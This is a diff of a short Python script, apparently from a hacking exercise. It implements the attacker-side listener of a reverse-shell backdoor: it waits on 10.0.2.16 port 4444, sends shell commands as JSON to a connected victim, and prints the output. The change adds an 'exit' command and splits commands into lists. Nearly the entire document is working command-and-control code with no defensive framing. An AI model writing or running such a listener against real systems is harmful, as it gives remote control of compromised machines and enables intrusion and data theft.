@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # tcp pass data in stream by client rather than message .hence 1024 only at time to receive.server dont have knowledge of end of data 
 # so for larger data to be send than 1024, use serialisation(json/pickle) form so json package data in form of text 
-#more dssdd.txt command dont give all value
+# more dssdd.txt command dont give all value
 import socket,json
 class Listener:
     def __init__(self,ip,port):
@@ -26,11 +26,16 @@ class Listener:
         self.connection.send(json_data)    
     def execute_remotly(self,command):
         self.reliable_send(command) 
+        if command[0]=="exit":
+            self.connection.close()
+            exit()
         return self.reliable_receive() 
 
     def run(self):
         while True:
             command = input(">>")
+            command=command.split(" ")#send command in list besause serialization helps to send in any form
+            # print(command)
             result=self.execute_remotly(command)
             print(result)
 listener_obj=Listener("10.0.2.16",4444)
